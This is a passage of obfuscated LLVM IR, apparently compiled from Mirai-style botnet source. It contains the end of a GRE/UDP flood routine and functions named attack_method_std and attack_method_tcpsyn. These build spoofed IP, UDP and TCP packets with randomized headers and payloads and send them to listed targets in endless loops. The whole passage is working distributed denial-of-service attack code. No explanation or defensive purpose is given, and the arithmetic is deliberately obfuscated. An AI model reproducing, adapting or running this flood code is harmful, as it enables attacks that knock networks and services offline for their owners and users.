  %425 = call i32 @rand_next()
  %426 = xor i32 65535, -1
  %427 = xor i32 %425, %426
  %428 = and i32 %427, %425
  %429 = and i32 %425, 65535
  %430 = trunc i32 %428 to i16
  %431 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %432 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %431, i32 0, i32 0
  store i16 %430, i16* %432, align 2
  br label %433

; <label>:433:                                    ; preds = %424, %420
  %434 = load i16, i16* %17, align 2
  %435 = zext i16 %434 to i32
  %436 = icmp eq i32 %435, 65535
  br i1 %436, label %437, label %450

; <label>:437:                                    ; preds = %433
  %438 = call i32 @rand_next()
  %439 = xor i32 %438, -1
  %440 = xor i32 65535, -1
  %441 = xor i32 857083832, -1
  %442 = or i32 %439, %440
  %443 = or i32 857083832, %441
  %444 = xor i32 %442, -1
  %445 = and i32 %444, %443
  %446 = and i32 %438, 65535
  %447 = trunc i32 %445 to i16
  %448 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %449 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %448, i32 0, i32 1
  store i16 %447, i16* %449, align 2
  br label %450

; <label>:450:                                    ; preds = %437, %433
  %451 = load i8, i8* %20, align 1
  %452 = icmp ne i8 %451, 0
  br i1 %452, label %457, label %453

; <label>:453:                                    ; preds = %450
  %454 = call i32 @rand_next()
  %455 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %456 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %455, i32 0, i32 9
  store i32 %454, i32* %456, align 4
  br label %463

; <label>:457:                                    ; preds = %450
  %458 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %459 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %458, i32 0, i32 9
  %460 = load i32, i32* %459, align 4
  %461 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %462 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %461, i32 0, i32 9
  store i32 %460, i32* %462, align 4
  br label %463

; <label>:463:                                    ; preds = %457, %453
  %464 = call i32 @rand_next()
  store i32 %464, i32* %37, align 4
  %465 = call i32 @rand_next()
  store i32 %465, i32* %38, align 4
  %466 = call i32 @rand_next()
  store i32 %466, i32* %39, align 4
  %467 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %468 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %467, i32 0, i32 0
  %469 = getelementptr inbounds [6 x i8], [6 x i8]* %468, i32 0, i32 0
  %470 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %469, i8* %470, i32 4)
  %471 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %472 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %471, i32 0, i32 1
  %473 = getelementptr inbounds [6 x i8], [6 x i8]* %472, i32 0, i32 0
  %474 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %473, i8* %474, i32 4)
  %475 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %476 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %475, i32 0, i32 0
  %477 = getelementptr inbounds [6 x i8], [6 x i8]* %476, i32 0, i32 0
  %478 = getelementptr inbounds i8, i8* %477, i64 4
  %479 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %478, i8* %479, i32 2)
  %480 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %481 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %480, i32 0, i32 1
  %482 = getelementptr inbounds [6 x i8], [6 x i8]* %481, i32 0, i32 0
  %483 = getelementptr inbounds i8, i8* %482, i64 4
  %484 = bitcast i32* %39 to i8*
  %485 = getelementptr inbounds i8, i8* %484, i64 2
  call void @util_memcpy(i8* %483, i8* %485, i32 2)
  %486 = load i8, i8* %19, align 1
  %487 = icmp ne i8 %486, 0
  br i1 %487, label %488, label %491

; <label>:488:                                    ; preds = %463
  %489 = load i8*, i8** %36, align 8
  %490 = load i32, i32* %18, align 4
  call void @rand_str(i8* %489, i32 %490)
  br label %491

; <label>:491:                                    ; preds = %488, %463
  %492 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %493 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %492, i32 0, i32 7
  store i16 0, i16* %493, align 2
  %494 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %495 = bitcast %struct.iphdr* %494 to i16*
  %496 = call zeroext i16 @checksum_generic(i16* %495, i32 20)
  %497 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %498 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %497, i32 0, i32 7
  store i16 %496, i16* %498, align 2
  %499 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %500 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %499, i32 0, i32 7
  store i16 0, i16* %500, align 2
  %501 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %502 = bitcast %struct.iphdr* %501 to i16*
  %503 = call zeroext i16 @checksum_generic(i16* %502, i32 20)
  %504 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %505 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %504, i32 0, i32 7
  store i16 %503, i16* %505, align 2
  %506 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %507 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %506, i32 0, i32 3
  store i16 0, i16* %507, align 2
  %508 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %509 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %510 = bitcast %struct.udphdr* %509 to i8*
  %511 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %512 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %511, i32 0, i32 2
  %513 = load i16, i16* %512, align 2
  %514 = load i32, i32* %18, align 4
  %515 = sext i32 %514 to i64
  %516 = sub i64 0, 8
  %517 = sub i64 0, %515
  %518 = add i64 %516, %517
  %519 = sub i64 0, %518
  %520 = add i64 8, %515
  %521 = trunc i64 %519 to i32
  %522 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %508, i8* %510, i16 zeroext %513, i32 %521)
  %523 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %524 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %523, i32 0, i32 3
  store i16 %522, i16* %524, align 2
  %525 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %526 = load i32, i32* %9, align 4
  %527 = sext i32 %526 to i64
  %528 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %525, i64 %527
  %529 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %528, i32 0, i32 0
  %530 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %529, i32 0, i32 0
  store i16 2, i16* %530, align 4
  %531 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %532 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %531, i32 0, i32 9
  %533 = load i32, i32* %532, align 4
  %534 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %535 = load i32, i32* %9, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %534, i64 %536
  %538 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %537, i32 0, i32 0
  %539 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %538, i32 0, i32 2
  %540 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %539, i32 0, i32 0
  store i32 %533, i32* %540, align 4
  %541 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %542 = load i32, i32* %9, align 4
  %543 = sext i32 %542 to i64
  %544 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %541, i64 %543
  %545 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %544, i32 0, i32 0
  %546 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %545, i32 0, i32 1
  store i16 0, i16* %546, align 2
  %547 = load i32, i32* %10, align 4
  %548 = load i8*, i8** %30, align 8
  %549 = load i32, i32* %18, align 4
  %550 = sext i32 %549 to i64
  %551 = sub i64 0, 66
  %552 = sub i64 0, %550
  %553 = add i64 %551, %552
  %554 = sub i64 0, %553
  %555 = add i64 66, %550
  %556 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %557 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %558 = load i32, i32* %9, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %557, i64 %559
  %561 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %560, i32 0, i32 0
  %562 = bitcast %struct.sockaddr_in* %561 to %struct.sockaddr*
  store %struct.sockaddr* %562, %struct.sockaddr** %556, align 8
  %563 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %564 = load %struct.sockaddr*, %struct.sockaddr** %563, align 8
  %565 = call i64 @sendto(i32 %547, i8* %548, i64 %554, i32 16384, %struct.sockaddr* %564, i32 16)
  br label %566

; <label>:566:                                    ; preds = %491
  %567 = load i32, i32* %9, align 4
  %568 = sub i32 %567, 1548220522
  %569 = add i32 %568, 1
  %570 = add i32 %569, 1548220522
  %571 = add nsw i32 %567, 1
  store i32 %570, i32* %9, align 4
  br label %323

; <label>:572:                                    ; preds = %323
  br label %322

; <label>:573:                                    ; preds = %92, %86
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %174, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %181

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %155

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #7
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = sub i32 0, %132
  %143 = sub i32 0, %141
  %144 = add i32 %142, %143
  %145 = sub i32 0, %144
  %146 = add i32 %132, %141
  %147 = call i32 @htonl(i32 %145) #7
  %148 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %149 = load i32, i32* %9, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i64 %150
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %151, i32 0, i32 0
  %153 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %152, i32 0, i32 2
  %154 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %153, i32 0, i32 0
  store i32 %147, i32* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %125, %116
  %156 = load i32*, i32** %11, align 8
  %157 = load i32, i32* %9, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds i32, i32* %156, i64 %158
  %160 = load i32, i32* %159, align 4
  %161 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 0
  %167 = bitcast %struct.sockaddr_in* %166 to %struct.sockaddr*
  store %struct.sockaddr* %167, %struct.sockaddr** %161, align 8
  %168 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %169 = load %struct.sockaddr*, %struct.sockaddr** %168, align 8
  %170 = call i32 @connect(i32 %160, %struct.sockaddr* %169, i32 16)
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %172, label %173

; <label>:172:                                    ; preds = %155
  br label %173

; <label>:173:                                    ; preds = %172, %155
  br label %174

; <label>:174:                                    ; preds = %173
  %175 = load i32, i32* %9, align 4
  %176 = sub i32 0, %175
  %177 = sub i32 0, 1
  %178 = add i32 %176, %177
  %179 = sub i32 0, %178
  %180 = add nsw i32 %175, 1
  store i32 %179, i32* %9, align 4
  br label %58

; <label>:181:                                    ; preds = %58
  br label %182

; <label>:182:                                    ; preds = %216, %181
  store i32 0, i32* %9, align 4
  br label %183

; <label>:183:                                    ; preds = %210, %182
  %184 = load i32, i32* %9, align 4
  %185 = load i8, i8* %5, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %184, %186
  br i1 %187, label %188, label %216

; <label>:188:                                    ; preds = %183
  %189 = load i8**, i8*** %10, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8*, i8** %189, i64 %191
  %193 = load i8*, i8** %192, align 8
  store i8* %193, i8** %22, align 8
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  br i1 %195, label %196, label %200

; <label>:196:                                    ; preds = %188
  %197 = load i8*, i8** %22, align 8
  %198 = load i16, i16* %14, align 2
  %199 = zext i16 %198 to i32
  call void @rand_str(i8* %197, i32 %199)
  br label %200

; <label>:200:                                    ; preds = %196, %188
  %201 = load i32*, i32** %11, align 8
  %202 = load i32, i32* %9, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds i32, i32* %201, i64 %203
  %205 = load i32, i32* %204, align 4
  %206 = load i8*, i8** %22, align 8
  %207 = load i16, i16* %14, align 2
  %208 = zext i16 %207 to i64
  %209 = call i64 @send(i32 %205, i8* %206, i64 %208, i32 16384)
  br label %210

; <label>:210:                                    ; preds = %200
  %211 = load i32, i32* %9, align 4
  %212 = add i32 %211, -1157137999
  %213 = add i32 %212, 1
  %214 = sub i32 %213, -1157137999
  %215 = add nsw i32 %211, 1
  store i32 %214, i32* %9, align 4
  br label %183

; <label>:216:                                    ; preds = %183
  br label %182
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %583

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %583

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %406, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %413

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
